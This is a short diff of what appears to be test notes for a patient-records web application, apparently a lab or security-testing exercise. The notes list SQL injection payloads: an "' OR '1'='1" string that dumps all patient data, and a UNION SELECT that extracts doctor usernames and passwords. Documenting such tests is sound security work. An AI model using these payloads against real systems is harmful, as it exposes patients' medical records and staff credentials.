@@ -45,7 +45,7 @@ Login bypass:
 
 Patient search (after login):
 1. <<' OR '1'='1>>: get all patient data without name
-2. <<UNION SELECT password, username FROM Doctor -->>:  get all usernames and passwords
+2. <<'UNION SELECT password, username FROM Doctor -->>:  get all usernames and passwords
 
  
 
